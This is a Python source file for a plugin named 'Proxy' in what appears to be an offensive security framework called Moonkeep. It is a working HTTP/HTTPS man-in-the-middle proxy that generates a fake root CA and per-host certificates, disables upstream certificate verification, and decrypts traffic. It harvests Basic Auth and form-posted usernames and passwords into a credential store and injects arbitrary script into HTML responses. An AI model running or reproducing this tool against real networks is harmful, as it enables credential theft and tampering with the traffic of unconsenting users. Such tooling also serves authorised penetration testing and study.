from core.plugin_manager import BasePlugin
import os
import re
import select
import socket
import ssl
import subprocess
import threading
import tempfile


class ProxyPlugin(BasePlugin):
    def __init__(self):
        self.running = False
        self.port    = 8080
        self.server: socket.socket | None = None
        self.script: str | None = None
        self._ca_cert: str | None = None
        self._ca_key:  str | None = None
        self._cert_dir = tempfile.mkdtemp(prefix="moonkeep_certs_")
        self._pending_req: dict[str, bytes] = {}
        self._setup_ca()

    @property
    def name(self) -> str:
        return "Proxy"

    @property
    def description(self) -> str:
        return "Scriptable HTTP/HTTPS MITM Proxy"

    # ------------------------------------------------------------------
    # CA bootstrap — one-time self-signed root CA via openssl
    # ------------------------------------------------------------------

    def _setup_ca(self):
        ca_key  = os.path.join(self._cert_dir, "ca.key")
        ca_cert = os.path.join(self._cert_dir, "ca.crt")
        if not os.path.exists(ca_cert):
            try:
                subprocess.run(
                    ["openssl", "req", "-x509", "-newkey", "rsa:2048",
                     "-keyout", ca_key, "-out", ca_cert,
                     "-days", "3650", "-nodes",
                     "-subj", "/CN=Moonkeep MITM CA/O=Moonkeep"],
                    check=True, capture_output=True,
                )
            except (FileNotFoundError, subprocess.CalledProcessError):
                return
        self._ca_key  = ca_key
        self._ca_cert = ca_cert

    def _get_host_cert(self, hostname: str) -> tuple[str, str] | None:
        """Return (cert_path, key_path) for hostname, generating if needed."""
        if not self._ca_cert or not self._ca_key:
            return None
        safe   = re.sub(r"[^a-zA-Z0-9._-]", "_", hostname)
        h_key  = os.path.join(self._cert_dir, f"{safe}.key")
        h_cert = os.path.join(self._cert_dir, f"{safe}.crt")
        if not os.path.exists(h_cert):
            try:
                csr = os.path.join(self._cert_dir, f"{safe}.csr")
                subprocess.run(
                    ["openssl", "req", "-newkey", "rsa:2048", "-keyout", h_key,
                     "-out", csr, "-nodes",
                     "-subj", f"/CN={hostname}"],
                    check=True, capture_output=True,
                )
                subprocess.run(
                    ["openssl", "x509", "-req", "-in", csr,
                     "-CA", self._ca_cert, "-CAkey", self._ca_key,
                     "-CAcreateserial", "-out", h_cert,
                     "-days", "365", "-sha256",
                     "-extfile", "/dev/stdin"],
                    input=f"subjectAltName=DNS:{hostname}",
                    text=True, check=True, capture_output=True,
                )
            except (FileNotFoundError, subprocess.CalledProcessError):
                return None
        return h_cert, h_key

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------

    async def start(self, port: int = 8080, script: str | None = None):
        if self.running:
            return
        self.port   = port
        self.script = script
        self.running = True

        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind(("0.0.0.0", self.port))
        self.server.listen(100)

        t = threading.Thread(target=self._run_server, daemon=True)
        t.start()
        print(f"Proxy: MITM listener on :{self.port}  (CA cert: {self._ca_cert})")
        self.emit("PROXY_STARTED", {"port": self.port, "ca": self._ca_cert})

    async def stop(self):
        self.running = False
        if self.server:
            self.server.close()
        print("Proxy: stopped.")

    # ------------------------------------------------------------------
    # Accept loop
    # ------------------------------------------------------------------

    def _run_server(self):
        while self.running and self.server:
            try:
                client_sock, addr = self.server.accept()
                threading.Thread(
                    target=self._handle_client,
                    args=(client_sock,),
                    daemon=True,
                ).start()
            except Exception:
                break

    # ------------------------------------------------------------------
    # Client handler — HTTP and HTTPS CONNECT
    # ------------------------------------------------------------------

    def _handle_client(self, client_sock: socket.socket):
        try:
            raw = client_sock.recv(8192)
            if not raw:
                client_sock.close()
                return
            first_line = raw.split(b"\r\n")[0].decode("utf-8", errors="ignore")

            if first_line.startswith("CONNECT"):
                # HTTPS MITM
                host_port = first_line.split(" ")[1]
                host = host_port.split(":")[0]
                port = int(host_port.split(":")[1]) if ":" in host_port else 443

                # Ack the tunnel
                client_sock.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")

                pair = self._get_host_cert(host)
                if pair:
                    cert_path, key_path = pair
                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                    ctx.load_cert_chain(cert_path, key_path)
                    try:
                        client_ssl = ctx.wrap_socket(client_sock, server_side=True)
                        self._relay_https(client_ssl, host, port)
                    except ssl.SSLError:
                        self._tunnel(client_sock, host, port)
                else:
                    self._tunnel(client_sock, host, port)
            else:
                # Plain HTTP
                host, port = self._extract_host(raw)
                if not host:
                    client_sock.close()
                    return
                self._relay_http(client_sock, host, port, raw)

        except Exception as exc:
            self.emit("ERROR", {"msg": f"Proxy handler: {exc}"})
        finally:
            try:
                client_sock.close()
            except Exception:
                pass

    # ------------------------------------------------------------------
    # HTTPS MITM relay
    # ------------------------------------------------------------------

    def _relay_https(self, client_ssl, host: str, port: int):
        try:
            remote = socket.create_connection((host, port), timeout=10)
            remote_ctx = ssl.create_default_context()
            remote_ctx.check_hostname = False
            remote_ctx.verify_mode = ssl.CERT_NONE
            remote_ssl = remote_ctx.wrap_socket(remote, server_hostname=host)

            self._relay(client_ssl, remote_ssl, host)
        except Exception as exc:
            self.emit("WARN", {"msg": f"HTTPS relay error {host}: {exc}"})
        finally:
            try:
                remote_ssl.close()
            except Exception:
                pass

    def _relay(self, client, remote, host: str):
        while self.running:
            try:
                r, _, _ = select.select([client, remote], [], [], 5)
                if client in r:
                    data = client.recv(65535)
                    if not data:
                        break
                    self._log_traffic(data, direction="REQUEST", host=host)
                    remote.sendall(data)
                if remote in r:
                    data = remote.recv(65535)
                    if not data:
                        break
                    data = self._apply_script(data)
                    self._log_traffic(data, direction="RESPONSE", host=host)
                    client.sendall(data)
            except Exception:
                break

    # ------------------------------------------------------------------
    # Plain HTTP relay
    # ------------------------------------------------------------------

    def _relay_http(self, client_sock, host: str, port: int, initial_data: bytes):
        try:
            remote = socket.create_connection((host, port), timeout=10)
            self._log_traffic(initial_data, direction="REQUEST", host=host)
            remote.sendall(initial_data)
            self._relay(client_sock, remote, host)
        except Exception as exc:
            self.emit("WARN", {"msg": f"HTTP relay error {host}: {exc}"})
        finally:
            try:
                remote.close()
            except Exception:
                pass

    # ------------------------------------------------------------------
    # Blind tunnel fallback (no MITM possible)
    # ------------------------------------------------------------------

    def _tunnel(self, client_sock: socket.socket, host: str, port: int):
        try:
            remote = socket.create_connection((host, port), timeout=10)
        except Exception:
            client_sock.close()
            return
        try:
            while self.running:
                r, _, _ = select.select([client_sock, remote], [], [], 5)
                if client_sock in r:
                    data = client_sock.recv(65535)
                    if not data:
                        break
                    remote.sendall(data)
                if remote in r:
                    data = remote.recv(65535)
                    if not data:
                        break
                    client_sock.sendall(data)
        except Exception:
            pass
        finally:
            remote.close()

    # ------------------------------------------------------------------
    # Traffic analysis & credential extraction
    # ------------------------------------------------------------------

    def _log_traffic(self, data: bytes, direction: str, host: str):
        try:
            text = data.decode("utf-8", errors="ignore")
        except Exception:
            return

        # HTTP Basic Auth
        for m in re.finditer(
            r"Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)", text, re.IGNORECASE
        ):
            import base64
            try:
                decoded = base64.b64decode(m.group(1)).decode("utf-8", errors="ignore")
                cred = f"HTTP-Basic:{host}:{decoded}"
                self.emit("CREDENTIAL_FOUND", {"cred": cred, "host": host})
                if self.target_store:
                    self.target_store.save_credential("Proxy:BasicAuth", cred)
            except Exception:
                pass

        # Form POST credentials
        if "POST" in text and direction == "REQUEST":
            for m in re.finditer(
                r"(?i)(?:user(?:name)?|email|login)=([^&\r\n]+).*?"
                r"(?:pass(?:word)?|pwd)=([^&\r\n]+)",
                text, re.DOTALL,
            ):
                cred = f"HTTP-Form:{host}:{m.group(1).strip()}:{m.group(2).strip()}"
                self.emit("CREDENTIAL_FOUND", {"cred": cred, "host": host})
                if self.target_store:
                    self.target_store.save_credential("Proxy:FormPost", cred)

        # Buffer request so we can emit a paired WEB_TRAFFIC event with the response
        if direction == "REQUEST":
            self._pending_req[host] = data
        elif direction == "RESPONSE":
            req_bytes = self._pending_req.pop(host, b"")
            # Emit paired event for passive web scanning (only for HTTP, skip large binary blobs)
            if len(data) < 1_048_576:  # skip huge responses (images, downloads)
                self.emit("WEB_TRAFFIC", {
                    "host": host,
                    "request": req_bytes,
                    "response": data,
                })

        self.emit("TRAFFIC", {"host": host, "direction": direction, "bytes": len(data)})

    # ------------------------------------------------------------------
    # Script injection hook
    # ------------------------------------------------------------------

    def _apply_script(self, data: bytes) -> bytes:
        if not self.script:
            return data
        try:
            text = data.decode("utf-8", errors="ignore")
            if "</body>" in text.lower() and "<script>" not in self.script:
                inject = f"<script>{self.script}</script>"
                text = re.sub(r"(?i)</body>", inject + "</body>", text, count=1)
                return text.encode("utf-8")
        except Exception:
            pass
        return data

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _extract_host(raw: bytes) -> tuple[str, int]:
        try:
            text = raw.decode("utf-8", errors="ignore")
            for line in text.split("\r\n"):
                if line.lower().startswith("host:"):
                    host_val = line.split(":", 1)[1].strip()
                    if ":" in host_val:
                        h, p = host_val.rsplit(":", 1)
                        return h, int(p)
                    return host_val, 80
        except Exception:
            pass
        return "", 80
